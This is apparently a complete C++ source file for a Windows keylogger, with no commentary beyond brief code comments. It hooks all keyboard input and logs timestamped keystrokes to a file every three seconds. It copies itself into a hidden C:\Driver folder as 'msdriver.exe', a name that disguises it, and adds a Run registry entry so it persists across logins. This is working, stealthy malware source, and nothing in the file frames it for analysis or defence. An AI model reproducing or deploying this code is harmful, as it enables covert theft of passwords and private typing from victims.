#define _CRT_SECURE_NO_WARNINGS

#include <string>
#include <fstream>

#include <winternl.h>
#include <windows.h>
#include <WinBase.h>
#include <tchar.h>

typedef std::basic_string<TCHAR, std::char_traits<TCHAR>, std::allocator<TCHAR> > tstring;

//Global variables
tstring keyLog;
HANDLE logFileHandle;
MSG msg;

//Function prototypes
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime);
void processLog();

//Main
int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
{
	//WM_KEYBOARD_LL hook
	SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);

	//Get current instance's executable file path
	TCHAR szFileName[MAX_PATH];
	GetModuleFileName(NULL, szFileName, MAX_PATH);

	//Copy to C:
	CreateDirectory(_T("c:\\driver"), NULL);
	SetFileAttributes(_T("C:\\Driver"), FILE_ATTRIBUTE_HIDDEN);
	CopyFile(szFileName, _T("C:\\Driver\\msdriver.exe"), TRUE);

	//Copy to autorun
	HKEY hKey = NULL;
	LONG result = RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey);
	RegSetValueEx(hKey, _T("Autorun"), 0, REG_SZ, (PBYTE)szFileName, lstrlen(szFileName) * sizeof(TCHAR) + 1);
	RegCloseKey(hKey);

	//Create timer
	SetTimer(NULL, 1, 3000, TimerCallback);

	//Create or open log file
	logFileHandle = CreateFile(_T("c:\\driver\\bin"),
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE | FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		0);
	SetFilePointer(logFileHandle, 0, NULL, FILE_END); //Write to end of file

	//Main cycle
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	KillTimer(NULL, 1); //Destroy timer
	CloseHandle(logFileHandle); //Close file handle
	processLog();
	return 0;
}

//Keyboard event
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION && wParam == WM_KEYDOWN)
	{
		//Time
		WCHAR timeBuf[10];
		SYSTEMTIME st;
		GetLocalTime(&st);
		_stprintf(timeBuf, _T("%.2u:%.2u:%.2u "), st.wHour, st.wMinute, st.wSecond);
		tstring line(timeBuf);

		//Virtual key code
		DWORD vkCode = (((LPKBDLLHOOKSTRUCT)lParam)->vkCode);

		//Modifiers
		if (vkCode != VK_SHIFT && GetAsyncKeyState(VK_SHIFT)) line += _T("SHIFT + ");
		if (vkCode != VK_CONTROL && GetAsyncKeyState(VK_CONTROL)) line += _T("CTRL + ");
		if (vkCode != VK_MENU && GetAsyncKeyState(VK_MENU)) line += _T("ALT + ");

		//A-Z
		if (vkCode >= 0x41 && vkCode <= 0x5A)
			line += (TCHAR)vkCode;
		else
		{ //Other Keys
			TCHAR keyName[20];
			GetKeyNameText(MapVirtualKey(vkCode, NULL) << 16, keyName, 20);
			line.append(keyName);
		}

		keyLog += line + _T("\n");
		line.clear();
	}
	return 0;
}

//Timer elapsed
VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime)
{
	processLog();
}

void processLog()
{
	DWORD numberOfBytesWritten;
	WriteFile(logFileHandle, keyLog.c_str(), _tcslen(keyLog.c_str()) * sizeof(TCHAR), &numberOfBytesWritten, NULL);
	keyLog.clear();
}